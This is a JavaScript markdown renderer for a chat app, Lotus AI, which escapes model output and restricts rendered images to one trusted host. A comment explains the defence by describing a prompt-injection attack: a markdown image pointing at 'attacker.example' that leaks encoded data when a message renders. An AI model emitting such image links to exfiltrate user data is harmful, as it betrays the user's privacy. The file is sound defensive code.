/**
 * ==========================================================
 * Lotus AI - Minimal Markdown Renderer
 * ==========================================================
 * Deliberately small: covers what chat responses actually use
 * (code blocks, inline code, bold/italic, links, line breaks)
 * without pulling in a full markdown dependency. Input is
 * HTML-escaped FIRST, then a safe subset of markdown syntax is
 * turned into HTML — so raw HTML/script in a model response
 * can never execute.
 * ==========================================================
 */

import { escapeHtml } from "./utils.js";

// The only domain Lotus AI itself ever generates image URLs from
// (js/imageGen.js). Restricting rendered <img> tags to this allowlist
// stops a prompt-injection attack where a model response (or content
// smuggled in via an attached file/web page) contains
// "![](https://attacker.example/track?data=...)" — without this, that
// would silently fire a real network request the moment the message
// renders, leaking whatever the attacker encoded in the URL. Any
// non-matching image URL just renders as a plain link instead.
const TRUSTED_IMAGE_HOSTS = ["image.pollinations.ai"];

function isTrustedImageUrl(url) {

    try {

        return TRUSTED_IMAGE_HOSTS.includes(new URL(url).hostname);

    } catch {

        return false;
    }
}

function renderInline(text) {

    return text
        .replace(/\*\*(.+?)\*\*/g, "<strong>$1</strong>")
        .replace(/(?<!\*)\*(?!\*)(.+?)\*(?!\*)/g, "<em>$1</em>")
        .replace(/`([^`]+?)`/g, "<code>$1</code>")
        .replace(/!\[(.*?)\]\((https?:\/\/[^\s)]+)\)/g, (match, alt, url) =>
            isTrustedImageUrl(url)
                ? `<img src="${url}" alt="${alt}" loading="lazy" class="message-image">`
                : `<a href="${url}" target="_blank" rel="noopener noreferrer">${alt || url}</a>`
        )
        .replace(/\[(.+?)\]\((https?:\/\/[^\s)]+)\)/g, '<a href="$2" target="_blank" rel="noopener noreferrer">$1</a>');
}

export function renderMarkdown(rawText) {

    const escaped = escapeHtml(rawText);

    const blocks = escaped.split(/```/g);

    let html = "";

    blocks.forEach((block, index) => {

        const isCodeBlock = index % 2 === 1;

        if (isCodeBlock) {

            const firstLineBreak = block.indexOf("\n");

            const lang = firstLineBreak === -1 ? "" : block.slice(0, firstLineBreak).trim();

            const code = firstLineBreak === -1 ? block : block.slice(firstLineBreak + 1);

            html += `
                <div class="code-block">
                    <div class="code-block-header">
                        <span>${escapeHtml(lang || "kod")}</span>
                        <button class="code-copy-button" type="button">Kopyala</button>
                    </div>
                    <pre><code>${code}</code></pre>
                </div>
            `;

        } else {

            const paragraphHtml = block
                .split(/\n{2,}/)
                .map(paragraph => renderInline(paragraph).replace(/\n/g, "<br>"))
                .filter(paragraph => paragraph.trim().length > 0)
                .map(paragraph => `<p>${paragraph}</p>`)
                .join("");

            html += paragraphHtml;
        }
    });

    return html;
}

/**
 * Wires up "Kopyala" buttons rendered inside code blocks by
 * renderMarkdown(). Call once after inserting HTML into the DOM.
 */
export function bindCodeCopyButtons(container) {

    container.querySelectorAll(".code-copy-button").forEach(button => {

        if (button.dataset.bound) return;

        button.dataset.bound = "true";

        button.addEventListener("click", async () => {

            const code = button.closest(".code-block")?.querySelector("code")?.textContent ?? "";

            try {

                await navigator.clipboard.writeText(code);

                const original = button.textContent;

                button.textContent = "Kopyalandı ✓";

                setTimeout(() => { button.textContent = original; }, 1500);

            } catch (error) {

                console.warn("Kopyalama başarısız:", error);
            }
        });
    });
}
